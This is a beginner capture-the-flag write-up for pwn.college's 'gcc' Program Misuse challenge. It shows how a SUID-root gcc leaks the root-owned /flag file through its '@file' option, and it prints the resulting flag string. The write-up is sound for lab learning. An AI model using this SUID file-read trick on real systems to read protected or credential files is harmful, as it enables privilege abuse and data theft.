---
layout: page
title: "Challenge Name: gcc"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/gcc`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/gcc
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/gcc
```

- The `s` in `-rws` indicates it's a SUID binary.
- `gcc` runs with **root privileges**.

## 🚀 Exploitation

The `gcc` has @ option which read additional command-line options from a file.

```bash
gcc @/flag
```

Output:
```
gcc: error: pwn.college{ohija7-Bp5zIpS8Nc848PscIEAM.dBTOxwSM0IzMyEzW}: No such file or directory
gcc: fatal error: no input files
compilation terminated.
```
